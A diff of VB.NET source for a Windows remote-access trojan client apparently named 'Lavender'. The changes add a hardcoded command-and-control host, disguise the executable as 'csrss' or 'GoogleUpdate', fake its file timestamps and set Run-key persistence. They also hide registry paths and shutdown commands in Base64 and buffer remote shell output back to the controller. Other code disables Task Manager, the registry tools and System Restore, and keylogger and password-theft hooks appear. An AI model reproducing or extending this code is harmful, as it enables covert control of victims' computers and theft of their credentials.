@@ -7,6 +7,7 @@ Imports System.Text
 Imports System.ComponentModel
 Imports System.Security.Principal
 Imports System.DirectoryServices
+Imports System.Text.RegularExpressions
 
 Public Class Main
 
@@ -31,7 +32,7 @@ Public Class Main
     ''' <summary>
     ''' Event timers
     ''' </summary>
-    Public ConTimer, ForeTimer, ServeTimer As Timers.Timer
+    Public ConTimer, ForeTimer, ServeTimer, ShellTimer As Timers.Timer
     ''' <summary>
     ''' Socket instance
     ''' </summary>s
@@ -79,7 +80,6 @@ Public Class Main
     ''' <summary>
     ''' Current AES password
     ''' </summary>
-    ''' 
     Public Shared salt As String
     ''' <summary>
     ''' Encryptor instance
@@ -118,6 +118,10 @@ Public Class Main
     ''' </summary>
     Private makel As String = ""
     ''' <summary>
+    ''' Stored current status
+    ''' </summary>
+    Private cstatus As Boolean = 0
+    ''' <summary>
     ''' CPU performance counter
     ''' </summary>
     Dim cpu As New PerformanceCounter()
@@ -125,6 +129,10 @@ Public Class Main
     ''' Webcam stream TODO: Implement
     ''' </summary>
     Dim streamWebcam As Boolean = False
+    ''' <summary>
+    ''' Buffer for command shell data
+    ''' </summary>
+    Dim shellbuffer As String
     ''' <summary>
     ''' Keylogger data file extension
     ''' </summary>
@@ -143,6 +151,9 @@ Public Class Main
     ''' </summary>
     Dim lastInputInf As New LASTINPUTINFO()
     Private Shared syncl As New Object '<-- global
+    Dim num_cores As Integer = 0
+    Dim clres As ManagementObjectCollection = New ManagementObjectSearcher("Select CommandLine, ProcessId FROM Win32_Process").Get
+    Dim cpres As ManagementObjectCollection = New ManagementObjectSearcher("Select IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get
 #End Region
 
 #Region "DLL Functions"
@@ -169,6 +180,11 @@ Public Class Main
         <MarshalAs(UnmanagedType.U4)> Public cbSize As Integer
         <MarshalAs(UnmanagedType.U4)> Public dwTime As Integer
     End Structure
+#If DEBUG Then
+    <DllImport("uxtheme", ExactSpelling:=True, CharSet:=CharSet.Unicode)>
+    Public Shared Function SetWindowTheme(hWnd As IntPtr, textSubAppName As [String], textSubIdList As [String]) As Int32
+    End Function
+#End If
 #End Region
 
     ''' <summary>
@@ -182,23 +198,33 @@ Public Class Main
         Return Caption.ToString()
     End Function
 
+    ''' <summary>
+    ''' Generate a random integer between specified numbers
+    ''' </summary>
+    ''' <param name="Min">Minimum random value</param>
+    ''' <param name="Max">Maximum random value</param>
+    ''' <returns></returns>
+    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
+        ' by making Generator static, we preserve the same instance '
+        ' (i.e., do not create new instances with the same seed over and over) '
+        ' between calls '
+        Static Generator As System.Random = New System.Random()
+        Return Generator.Next(Min, Max)
+    End Function
+
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
 #If DEBUG Then
-        'Me.WindowState = FormWindowState.Minimized
-        'Me.Hide()
-        'Me.ShowInTaskbar = False
-        'Me.Visible = False
-        'Me.TopMost = False
+        SetWindowTheme(Handle, "explorer", "")
         ''temporary preferences
-        HOST = "127.0.0.1" ''IP
+        HOST = "kahn.surfoye.com" ''IP
         LANScan = True
         port = 92 ''Port
         cname = "LavenderTest" ''Client Name
         copyse = False ''Copy (to temp)
-        sernam = "null" ''copy name (server name)
-        addtos = False ''add to startup
+        sernam = "GoogleUpdate" ''copy/imitation name
         StartupKey = "lavendertesting" ''startup key name
-        melts = "False" ''melt
+        addtos = False ''add to startup
+        melts = False ''melt/copy
         pk = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>" ''public key
         ConTimer = New Timers.Timer(2000) ''timer connection to client interval 5s
         ServeTimer = New Timers.Timer(5000) ''timer connection to webserver interval 5s
@@ -207,23 +233,21 @@ Public Class Main
         Me.ShowInTaskbar = False
         Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
         Me.Visible = False
-        HOST = "127.0.0.1" ''IP
+        ''todo dimensions of form = main screen dimensions
+        HOST = "kahn.surfoye.com" ''IP
         LANScan = True
         port = 92 ''Port
-        name = "ISSH" ''Campaign name
+        name = "Surf" ''Campaign name
         copyse = True ''Copy (to temp)
         sernam = "csrss" ''copy name (exe name)
-        addtos = True ''add to system
-        StartupKey = "GoogleChromeAutoLaunch_3244AC00F24414D33671F7B36CA62ABE" ''startup key name
+        addtos = True ''add to startup
+        StartupKey = "GoogleChromeAutoLaunch_3244AC00F34414D33671F7B36CA62ABE" ''startup key name
         melts = True ''melt
 
         ConTimer = New Timers.Timer(5000) ''timer connection to client interval 5s
         ServeTimer = New Timers.Timer(5000) ''timer connection to webserver interval 5s
 #End If
-        'If Not IO.Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)) Then
-        '    IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))
-        'End If
-
+        Me.Text = sernam
         cname += "_" & HWD()
         C = New SocketClient
         ForeTimer = New Timers.Timer(1000)
@@ -251,77 +275,80 @@ Public Class Main
                 If principal.IsInRole(WindowsBuiltInRole.Guest) Then
                     userRole += 1
                 End If
-
             End If
         End Using
 
         '-----------------------------MELT
+        Dim specialfolder As Environment.SpecialFolder = Environment.SpecialFolder.LocalApplicationData
+        If userRole >= 4 Then
+            specialfolder = Environment.SpecialFolder.CommonApplicationData
+        End If
+        ''todo more user levels
+        Dim fdir = Environment.GetFolderPath(specialfolder) & "\" ''TODO subfolder
+
+        Dim fpath As String = fdir & sernam & ".exe"
         Try
             If melts Then
-                If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe" Then
-                    If File.Exists(Path.GetTempPath & "melt.txt") Then
-                        Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
+                If Application.ExecutablePath = fpath Then
+                    If File.Exists(Path.GetTempPath & sernam & ".tmp") Then
+                        Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & sernam & ".tmp")) : Catch : End Try
                     End If
                 Else
-                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe") Then
-                        Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe") : Catch : End Try
-                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe")
-                        IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
-                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe")
-                        End
-                    Else
-                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe")
-                        IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
-                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) & "\Microsoft\svchost.exe")
-                        End
+                    If File.Exists(fpath) Then
+                        Try : IO.File.Delete(fpath) : Catch : End Try
                     End If
+                    If (Not System.IO.Directory.Exists(fdir)) Then
+                        System.IO.Directory.CreateDirectory(fdir)
+                    End If
+                    IO.File.Copy(Application.ExecutablePath, fpath)
+                    IO.File.WriteAllText(Path.GetTempPath & sernam & ".tmp", Application.ExecutablePath)
+                    Dim d As New DateTime(Now.Ticks) ''todo minus random time
+                    d.Subtract(TimeSpan.FromTicks(GetRandom(500000, 1000000)))
+                    IO.File.SetCreationTime(fpath, d)
+                    IO.File.SetLastAccessTime(fpath, d)
+                    IO.File.SetLastWriteTime(fpath, d)
+                    ''Start it, stop this
+                    Process.Start(fpath)
+                    End
                 End If
             End If
         Catch ex As Exception
-
+#If DEBUG Then
+            MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+#End If
         End Try
-        ''---------------------------COPY WTF basically the same as melt!
-        ''TODO: Make more advanced (see docs)
-        'If copyse Then
-        '    If Application.ExecutablePath = Path.GetTempPath & sernam & ".exe" Then
-        '        If File.Exists(Path.GetTempPath & "melt.txt") Then
-        '            '   Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
-        '        End If
-        '    Else
-        '        If File.Exists(Path.GetTempPath & sernam & ".exe") Then
-        '            Try : IO.File.Delete(Path.GetTempPath & sernam & ".exe") : Catch : End Try
-        '            IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
-        '            'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
-        '            Process.Start(Path.GetTempPath & sernam & ".exe")
-        '            End
-        '        Else
-        '            IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
-        '            'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
-        '            Process.Start(Path.GetTempPath & sernam & ".exe")
-        '            End
-        '        End If
-        '    End If
-        'End If
-
 
         ''add to start
-        'If addtos Then
-        '    Try
-        '        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
-        '        regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
-        '    Catch : End Try
-        'End If
+        Dim regKey As RegistryKey = Registry.CurrentUser
+        If userRole >= 4 Then
+            regKey = Registry.LocalMachine
+        End If
+        If addtos Then
+            Try
+                regKey.OpenSubKey(B64("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"), True)
+                regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
+            Catch : End Try
+        End If
 
-        gpasswords = Passwords.GT ''passwords and stuff
+        gpasswords = Passwords.GT ''passwords
 
-            o.Start() ''keylogger
+        o.Start() ''keylogger
 
+
+        ''Initialize taskman values and get them working
         With cpu
             .CategoryName = "Processor"
             .CounterName = "% Processor Time"
             .InstanceName = "_Total"
         End With
         cpu.NextValue()
+
+        Dim searcher As ManagementObjectSearcher = New ManagementObjectSearcher("Select * FROM Win32_Processor")
+        For Each proc As ManagementObject In searcher.Get
+            num_cores += Integer.Parse(proc("NumberOfCores").ToString())
+        Next
+
+
     End Sub
 
     Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
@@ -454,13 +481,24 @@ B:
                             GoTo B
                         End Try
                     Case n.uninstall ''todo: improve
+                        Try : PersistThread.Abort() : Catch ex As Exception : End Try
                         Try
-                            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
-                            PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()
-                            ''TODO: add deletion
-                        Catch ex As Exception
-                        End Try
-                        End
+                            Dim regKey As RegistryKey = Registry.CurrentUser
+                            If userRole >= 4 Then
+                                regKey = Registry.LocalMachine
+                            End If
+                            regKey.OpenSubKey(B64("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"), True)
+                            regKey.DeleteValue(StartupKey) : regKey.Close()
+                        Catch ex As Exception : End Try
+                        Try
+                            ''Delete this executable
+                            Dim Info As New ProcessStartInfo()
+                            Info.Arguments = B64("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsICIi") & Application.ExecutablePath & """"
+                            Info.WindowStyle = ProcessWindowStyle.Hidden
+                            Info.CreateNoWindow = True
+                            Info.FileName = "cmd.exe"
+                            Process.Start(Info)
+                        Catch ex As Exception : End Try : End ''DIE
                     Case n.upload ''upload recieve
                         Select Case A(1)
                             Case n.plugin ''load plugin
@@ -514,17 +552,17 @@ B:
                     Case n.openpower
                         C.Send(n.openpower)
                     Case n.logoff ''log off
-                        Shell("shutdown -l -t 0", AppWinStyle.Hide)
+                        Shell(B64("c2h1dGRvd24gL2wgL3QgMA=="), AppWinStyle.Hide)
                     Case n.sleep ''sleep
                         Application.SetSuspendState(PowerState.Suspend, True, False)
                     Case n.restart ''restart
-                        Shell("shutdown -r " & A(1), AppWinStyle.Hide)
+                        Shell(B64("c2h1dGRvd24gL3I=") & A(1), AppWinStyle.Hide)
                     Case n.shutdown ''shut down
-                        Shell("shutdown -s " & A(1), AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown.
+                        Shell(B64("c2h1dGRvd24gL3M=") & A(1), AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown.
                     Case n.lock ''lock
                         LockWorkStation
                     Case n.abort ''abort shutdown
-                        Shell("shutdown -a", AppWinStyle.Hide)
+                        Shell(B64("c2h1dGRvd24gL2E="), AppWinStyle.Hide)
                     Case n.getdrives
                         C.Send(n.getfileman & Sep & getDrives())
                     Case n.getfileman
@@ -570,15 +608,9 @@ B:
                         Dim cparr_pid As String() ''cpu array pid
                         Dim cparr_percent As String() ''cpu array percent
 
-                        Dim clres As ManagementObjectCollection = New ManagementObjectSearcher("Select CommandLine, ProcessId FROM Win32_Process").Get
-                        Dim cpres As ManagementObjectCollection = New ManagementObjectSearcher("Select IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get
+                        clres = New ManagementObjectSearcher("Select CommandLine, ProcessId FROM Win32_Process").Get
+                        cpres = New ManagementObjectSearcher("Select IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get
 
-                        Dim query = "SELECT * FROM Win32_Processor"
-                        Dim num_cores As Integer = 0
-                        Dim searcher As ManagementObjectSearcher = New ManagementObjectSearcher(query)
-                        For Each proc As ManagementObject In searcher.Get
-                            num_cores += Integer.Parse(proc("NumberOfCores").ToString())
-                        Next
 
                         ''Todo: Fix CPU Usage
                         Try
@@ -609,7 +641,7 @@ B:
                                 ReDim Preserve cparr_percent(i)
                                 Try
                                     cparr_pid(i) = mgmtObj.GetPropertyValue("IDProcess")
-                                    cparr_percent(i) = mgmtObj.GetPropertyValue("PercentProcessorTime")
+                                    cparr_percent(i) = mgmtObj.GetPropertyValue("PercentProcessorTime") / num_cores
                                 Catch ex As Exception
 #If DEBUG Then
                                     MsgBox(ex.Message & vbNewLine & ex.StackTrace)
@@ -707,21 +739,21 @@ B:
                     Case n.util_showtaskbar
                         Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H40))
                     Case n.util_disablecmd
-                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                        My.Computer.Registry.SetValue(B64("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcU3lzdGVt"), "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
                     Case n.util_enablecmd
-                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                        My.Computer.Registry.SetValue(B64("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcU3lzdGVt"), "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
                     Case n.util_disablereg
-                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                        My.Computer.Registry.SetValue(B64("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"), "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                     Case n.util_enablereg
-                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                        My.Computer.Registry.SetValue(B64("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"), "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
                     Case n.util_disablerestore
-                        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                        My.Computer.Registry.SetValue(B64("SEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFN5c3RlbVJlc3RvcmU="), "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
                     Case n.util_enablerestore
-                        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                        My.Computer.Registry.SetValue(B64("SEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFN5c3RlbVJlc3RvcmU="), "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                     Case n.util_disabletaskman
-                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                        My.Computer.Registry.SetValue(B64("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"), "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                     Case n.util_enabletaskman
-                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                        My.Computer.Registry.SetValue(B64("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"), "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
                     'Case "opentto"
                     '    C.Send("opentto")
                     'Case "TextToSpeech"
@@ -829,6 +861,7 @@ B:
                         Shl.BeginOutputReadLine()
                     Case n.putshell ''write to shell
                         Shl.StandardInput.WriteLine(A(1))
+                        Shl.StandardInput.WriteLine()
                     Case n.endshell ''kill shell
                         Try
                             Shl.Kill()
@@ -845,19 +878,47 @@ B:
     End Sub
     Private Sub ex() ''exit shell
         Try
+            ShellTimer.Stop()
+            ShellTimer.Dispose()
+            ShellTimer = Nothing
+        Catch ex As Exception : End Try
+        Try
             C.Send(n.endshell)
-        Catch ex As Exception
-        End Try
+        Catch ex As Exception : End Try
     End Sub
     Private Sub RS(ByVal a As Object, ByVal e As Object) ''Handles shell data
         Try
-            C.Send(n.getshell & Sep & e.Data)
+            If ShellTimer Is Nothing Then
+                ShellTimer = New Timers.Timer(100)
+                AddHandler ShellTimer.Elapsed, AddressOf ShellTimer_Tick
+                ShellTimer.Start()
+            End If
+            shellbuffer += e.Data & vbNewLine
         Catch ex As Exception
+#If DEBUG Then
+            MsgBox(ex.Message & vbNewLine & ex.StackTrace)
+#End If
         End Try
+    End Sub
+
+    Private Sub ShellTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)
+        If Not shellbuffer Is Nothing Then
+            C.Send(n.getshell & Sep & shellbuffer)
+        End If
+        shellbuffer = Nothing
     End Sub
 
     Private Shl As Process ''shell
 #End Region
+
+    Function B64(ByVal s As String)
+        Try
+            Dim stream As New MemoryStream(Convert.FromBase64String(s))
+            Return Encoding.UTF8.GetString(stream.ToArray())
+        Catch
+            Return s
+        End Try
+    End Function
 
     ''' <summary>
     ''' Add a string to a string with the data separator
@@ -889,16 +950,22 @@ B:
             lastInputInf.dwTime = 0
             GetLastInputInfo(lastInputInf)
             ''Label1.Text = CInt((Environment.TickCount - lastInputInf.dwTime) / 1000).ToString
-            If CInt((Environment.TickCount - lastInputInf.dwTime) / 1000) >= 10 Then 'check if it has been 60 seconds
-                'if no user input is detected in last 10s
-                C.Send(n.status & Sep & 1)
+            Dim itime As Integer = CInt((Environment.TickCount - lastInputInf.dwTime) / 1000)
+            If itime >= 60 Then 'check if it has been 60 seconds
+                'if no user input is detected in last 60s
+                If cstatus = False Then
+                    C.Send(n.status & Sep & 1)
+                    cstatus = True
+                End If
             Else
-                C.Send(n.status & Sep & 0)
+                If cstatus = True Then
+                    C.Send(n.status & Sep & 0)
+                    cstatus = False
+                End If
             End If
         Else
-            ''InfoLabel.Text = "Forewindows timer bad:" & inc
+            InfoLabel.Text = "Forewindows timer bad:" & inc
             inc += 1
-            ''MsgBox("2")
             C.DisConnect()
         End If
     End Sub
@@ -906,14 +973,20 @@ B:
     Private Sub ConTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)  ''5000
 #If DEBUG Then
         InfoLabel.Text = "attempt con:" & inc
+        Thread.Sleep(500)
 #End If
         inc += 1
         If C.Statconnected = False Then ''attempt connection
+            Try : C.Connect(HOST, port) : Catch ex As Exception : End Try
             Try
                 If LANScan Then
                     For Each computer As String In NetApi32.GetAllComputersInDomain
                         If C.Statconnected = False Then
                             Try
+#If DEBUG Then
+                                InfoLabel.Text = computer
+                                Thread.Sleep(500)
+#End If
                                 C.Connect(computer, port)
                             Catch ex As Exception
                             End Try
@@ -925,9 +998,6 @@ B:
                 MsgBox(ex.Message & vbNewLine & ex.StackTrace)
 #End If
             End Try
-            If C.Statconnected = False Then
-                C.Connect(HOST, port)
-            End If
         End If
     End Sub
     Private Sub ServeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs) ''connect to lavender web
